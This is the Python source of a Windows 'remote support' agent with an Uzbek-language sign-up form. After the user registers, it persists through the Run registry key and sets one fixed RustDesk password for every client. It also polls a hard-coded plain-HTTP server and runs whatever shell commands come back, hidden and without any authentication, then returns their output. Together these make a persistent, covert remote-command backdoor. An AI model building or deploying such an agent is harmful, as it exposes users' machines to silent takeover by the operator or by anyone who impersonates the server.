#!/usr/bin/env python3
"""
UstajonSupport Client Agent v8.0
Professional Remote Support System
"""

import os
import sys
import json
import time
import uuid
import socket
import hashlib
import threading
import subprocess
from pathlib import Path
from datetime import datetime

# ==================== CONFIG ====================
VERSION = "8.0.0"
APP_NAME = "UstajonSupport"
SERVER_URL = "http://31.220.75.75"
RUSTDESK_SERVER = "31.220.75.75"
RUSTDESK_KEY = "YHo+N4vp+ZWP7wedLh69zCGk3aFf4935hwDKX9OdFXE="
RUSTDESK_PASSWORD = "ustajon2025"

HEARTBEAT_INTERVAL = 10
COMMAND_CHECK_INTERVAL = 5

DATA_DIR = Path.home() / ".ustajon"
CONFIG_FILE = DATA_DIR / "config.json"

# ==================== UTILS ====================
def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

def get_machine_id():
    try:
        return hashlib.md5(f"{socket.gethostname()}-{uuid.getnode()}".encode()).hexdigest()[:12].upper()
    except:
        return uuid.uuid4().hex[:12].upper()

def get_hostname():
    try:
        return socket.gethostname()
    except:
        return "Unknown"

def get_os_info():
    try:
        r = subprocess.run(['wmic', 'os', 'get', 'Caption', '/value'],
            capture_output=True, text=True, timeout=15, creationflags=0x08000000)
        for line in r.stdout.split('\n'):
            if 'Caption=' in line:
                return line.split('=', 1)[1].strip()
    except:
        pass
    return "Windows"

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return ""

def load_config():
    try:
        if CONFIG_FILE.exists():
            return json.load(open(CONFIG_FILE, 'r', encoding='utf-8'))
    except:
        pass
    return {}

def save_config(data):
    try:
        DATA_DIR.mkdir(parents=True, exist_ok=True)
        json.dump(data, open(CONFIG_FILE, 'w', encoding='utf-8'), ensure_ascii=False, indent=2)
    except:
        pass

def add_to_startup():
    try:
        import winreg
        exe = sys.executable if getattr(sys, 'frozen', False) else f'pythonw "{os.path.abspath(__file__)}"'
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, exe)
        winreg.CloseKey(key)
    except:
        pass

# ==================== RUSTDESK ====================
def find_rustdesk_id():
    paths = [
        Path(os.environ.get('APPDATA', '')) / "RustDesk" / "config" / "RustDesk2.toml",
        Path.home() / "AppData" / "Roaming" / "RustDesk" / "config" / "RustDesk2.toml",
    ]
    for path in paths:
        try:
            if path.exists():
                for line in path.read_text(encoding='utf-8').split('\n'):
                    if line.strip().startswith('id') and '=' in line:
                        val = line.split('=', 1)[1].strip().strip("'\"")
                        if val and len(val) >= 6:
                            return val
        except:
            pass
    return None

def configure_rustdesk():
    path = Path(os.environ.get('APPDATA', '')) / "RustDesk" / "config" / "RustDesk2.toml"
    try:
        path.parent.mkdir(parents=True, exist_ok=True)
        config = {}
        if path.exists():
            for line in path.read_text(encoding='utf-8').split('\n'):
                if '=' in line and not line.strip().startswith('#'):
                    k, v = line.split('=', 1)
                    config[k.strip()] = v.strip()
        config['rendezvous_server'] = f"'{RUSTDESK_SERVER}'"
        config['key'] = f"'{RUSTDESK_KEY}'"
        config['password'] = f"'{RUSTDESK_PASSWORD}'"
        with open(path, 'w', encoding='utf-8') as f:
            for k, v in config.items():
                f.write(f"{k} = {v}\n")
    except:
        pass

def start_rustdesk():
    try:
        r = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq rustdesk.exe'],
            capture_output=True, text=True, timeout=10, creationflags=0x08000000)
        if 'rustdesk.exe' not in r.stdout.lower():
            for p in [Path(os.environ.get('PROGRAMFILES', '')) / "RustDesk" / "rustdesk.exe",
                      Path(os.environ.get('LOCALAPPDATA', '')) / "RustDesk" / "rustdesk.exe"]:
                if p.exists():
                    subprocess.Popen([str(p)], creationflags=0x08000000 | 0x00000008)
                    break
    except:
        pass

# ==================== HTTP ====================
def http_post(url, data):
    try:
        import urllib.request
        req = urllib.request.Request(url, data=json.dumps(data).encode('utf-8'),
            headers={'Content-Type': 'application/json'}, method='POST')
        with urllib.request.urlopen(req, timeout=15) as resp:
            return json.loads(resp.read().decode('utf-8'))
    except:
        return None

def http_get(url):
    try:
        import urllib.request
        with urllib.request.urlopen(url, timeout=15) as resp:
            return json.loads(resp.read().decode('utf-8'))
    except:
        return None

# ==================== CMD ====================
def run_cmd(command):
    try:
        r = subprocess.run(command, shell=True, capture_output=True, text=True,
            timeout=120, creationflags=0x08000000)
        return True, (r.stdout + r.stderr)[:8000]
    except subprocess.TimeoutExpired:
        return False, "Timeout"
    except Exception as e:
        return False, str(e)

# ==================== AGENT ====================
class Agent:
    def __init__(self):
        self.client_id = get_machine_id()
        self.config = load_config()
        self.rustdesk_id = None
        self.running = True
        self.registered = self.config.get('registered', False)
        log(f"Agent v{VERSION} | ID: {self.client_id}")
    
    def init_rustdesk(self):
        configure_rustdesk()
        start_rustdesk()
        time.sleep(2)
        for _ in range(10):
            self.rustdesk_id = find_rustdesk_id()
            if self.rustdesk_id:
                log(f"RustDesk ID: {self.rustdesk_id}")
                break
            time.sleep(1)
    
    def heartbeat(self):
        if not self.rustdesk_id:
            self.rustdesk_id = find_rustdesk_id()
        data = {
            "client_id": self.client_id,
            "rustdesk_id": self.rustdesk_id or "",
            "hostname": get_hostname(),
            "os_info": get_os_info(),
            "version": VERSION,
            "name": self.config.get('name', ''),
            "phone": self.config.get('phone', ''),
            "problem": self.config.get('problem', ''),
            "local_ip": get_ip()
        }
        return http_post(f"{SERVER_URL}/api/heartbeat", data)
    
    def check_commands(self):
        commands = http_get(f"{SERVER_URL}/api/agent/commands?client_id={self.client_id}")
        if not commands:
            return
        for cmd in commands:
            if cmd.get('status') != 'pending':
                continue
            success, output = run_cmd(cmd.get('command', ''))
            http_post(f"{SERVER_URL}/api/agent/command-result", {
                "client_id": self.client_id,
                "command_id": cmd.get('id'),
                "success": success,
                "output": output
            })
    
    def heartbeat_loop(self):
        while self.running:
            try:
                self.heartbeat()
            except:
                pass
            time.sleep(HEARTBEAT_INTERVAL)
    
    def command_loop(self):
        while self.running:
            try:
                self.check_commands()
            except:
                pass
            time.sleep(COMMAND_CHECK_INTERVAL)
    
    def register(self, name, phone, problem):
        self.config = {'name': name, 'phone': phone, 'problem': problem, 'registered': True}
        save_config(self.config)
        self.registered = True
        self.heartbeat()
        add_to_startup()
    
    def show_gui(self):
        import tkinter as tk
        from tkinter import messagebox
        
        root = tk.Tk()
        root.title(f"{APP_NAME} - Texnik Yordam")
        root.configure(bg='#0d1117')
        root.resizable(False, False)
        
        # KATTA OYNA - 480x720
        w, h = 480, 720
        x = (root.winfo_screenwidth() - w) // 2
        y = (root.winfo_screenheight() - h) // 2
        root.geometry(f"{w}x{h}+{x}+{y}")
        
        # Main container
        main = tk.Frame(root, bg='#0d1117')
        main.pack(fill='both', expand=True, padx=35, pady=25)
        
        # Header
        tk.Label(main, text="🔧", font=('Segoe UI', 48), bg='#0d1117', fg='#238636').pack(pady=(0, 5))
        tk.Label(main, text="Texnik Yordam", font=('Segoe UI', 24, 'bold'), bg='#0d1117', fg='white').pack()
        tk.Label(main, text="Ma'lumotlaringizni kiriting", font=('Segoe UI', 11), bg='#0d1117', fg='#8b949e').pack(pady=(5, 20))
        
        # RustDesk Info
        info = tk.Frame(main, bg='#161b22', highlightbackground='#30363d', highlightthickness=1)
        info.pack(fill='x', pady=(0, 20))
        inner = tk.Frame(info, bg='#161b22')
        inner.pack(fill='x', padx=15, pady=12)
        
        tk.Label(inner, text="🖥 RustDesk ID", font=('Segoe UI', 10), bg='#161b22', fg='#8b949e').pack(anchor='w')
        id_var = tk.StringVar(value=self.rustdesk_id or "Yuklanmoqda...")
        tk.Label(inner, textvariable=id_var, font=('Consolas', 18, 'bold'), bg='#161b22', fg='#58a6ff').pack(anchor='w', pady=(3, 0))
        status_var = tk.StringVar(value="⏳ RustDesk tekshirilmoqda...")
        status_lbl = tk.Label(inner, textvariable=status_var, font=('Segoe UI', 9), bg='#161b22', fg='#d29922')
        status_lbl.pack(anchor='w')
        
        # Form
        form = tk.Frame(main, bg='#0d1117')
        form.pack(fill='x')
        
        tk.Label(form, text="👤 Ismingiz", font=('Segoe UI', 11, 'bold'), bg='#0d1117', fg='white', anchor='w').pack(fill='x')
        name_e = tk.Entry(form, font=('Segoe UI', 13), bg='#21262d', fg='white', insertbackground='white',
            relief='flat', highlightthickness=1, highlightbackground='#30363d', highlightcolor='#238636')
        name_e.pack(fill='x', ipady=12, pady=(5, 15))
        
        tk.Label(form, text="📞 Telefon raqam", font=('Segoe UI', 11, 'bold'), bg='#0d1117', fg='white', anchor='w').pack(fill='x')
        phone_e = tk.Entry(form, font=('Segoe UI', 13), bg='#21262d', fg='white', insertbackground='white',
            relief='flat', highlightthickness=1, highlightbackground='#30363d', highlightcolor='#238636')
        phone_e.insert(0, "+998")
        phone_e.pack(fill='x', ipady=12, pady=(5, 15))
        
        tk.Label(form, text="📝 Muammo tavsifi", font=('Segoe UI', 11, 'bold'), bg='#0d1117', fg='white', anchor='w').pack(fill='x')
        prob_t = tk.Text(form, font=('Segoe UI', 12), bg='#21262d', fg='white', insertbackground='white',
            relief='flat', height=3, highlightthickness=1, highlightbackground='#30363d', highlightcolor='#238636')
        prob_t.pack(fill='x', pady=(5, 25))
        
        # SUBMIT BUTTON - KATTA
        def submit():
            n = name_e.get().strip()
            p = phone_e.get().strip()
            pr = prob_t.get('1.0', 'end').strip()
            if len(n) < 2:
                messagebox.showwarning("Xatolik", "Ismingizni kiriting!")
                return
            if len(p) < 9:
                messagebox.showwarning("Xatolik", "Telefon raqamni kiriting!")
                return
            self.register(n, p, pr or "Belgilanmagan")
            messagebox.showinfo("Tayyor! ✅", f"Ma'lumotlar yuborildi!\n\nRustDesk ID: {self.rustdesk_id or 'N/A'}\nParol: {RUSTDESK_PASSWORD}\n\nMutaxassis tez orada ulanadi.")
            root.destroy()
        
        btn = tk.Button(form, text="✅  YUBORISH", font=('Segoe UI', 16, 'bold'),
            bg='#238636', fg='white', activebackground='#2ea043', activeforeground='white',
            relief='flat', cursor='hand2', command=submit)
        btn.pack(fill='x', ipady=15)
        
        btn.bind('<Enter>', lambda e: btn.config(bg='#2ea043'))
        btn.bind('<Leave>', lambda e: btn.config(bg='#238636'))
        
        # Footer
        tk.Label(main, text=f"v{VERSION}", font=('Segoe UI', 9), bg='#0d1117', fg='#484f58').pack(side='bottom', pady=(20, 0))
        
        # Update ID
        def upd():
            if not self.rustdesk_id:
                self.rustdesk_id = find_rustdesk_id()
            if self.rustdesk_id:
                id_var.set(self.rustdesk_id)
                status_var.set("✅ Tayyor ulanishga")
                status_lbl.config(fg='#238636')
            if root.winfo_exists():
                root.after(2000, upd)
        root.after(500, upd)
        
        root.mainloop()
    
    def run(self):
        self.init_rustdesk()
        if not self.registered:
            self.show_gui()
        threading.Thread(target=self.heartbeat_loop, daemon=True).start()
        threading.Thread(target=self.command_loop, daemon=True).start()
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False

if __name__ == "__main__":
    Agent().run()
